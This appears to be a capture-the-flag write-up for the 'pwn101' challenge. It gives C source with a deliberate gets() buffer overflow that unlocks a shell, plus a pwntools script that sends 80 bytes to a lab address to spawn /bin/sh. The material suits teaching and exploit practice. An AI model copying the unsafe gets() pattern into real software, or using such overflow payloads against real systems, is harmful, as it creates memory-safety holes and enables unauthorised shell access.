```C
#include <stdio.h>
#include <stdlib.h>

void setup(){
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
}

void banner(){
    puts(
"       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐\n"
"        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ \n"
"        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘\n"
"                 pwn 101          \n"
    );
}

void main(){
    char inp[50];
    int is1337 = 1337;
    setup();
    banner();

    puts("Hello!, I am going to shopping.\n"
    "My mom told me to buy some ingredients.\n"
    "Ummm.. But I have low memory capacity, So I forgot most of them.\n"
    "Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n");
    puts("Type the required ingredients to make briyani: ");
    gets(inp);

    if (is1337 == 1337){
        puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
        exit(1337);
    }
    else{
    puts("Thanks, Here's a small gift for you <3");
        system("/bin/sh");
    }
}
```

1. Run `checksec`
2. Run `file`
3. Test the binary `pwn101.pwn101` locally
	- Test application for vulnerabilities here
## Solution
```python
#!/usr/bin/python3
ip = '10.10.228.132'
port = 9001
from pwn import *

r = remote(ip, port)
payload = b"A"*80
r.recvuntil(b"briyani:")
r.sendline(payload)
r.interactive()
```

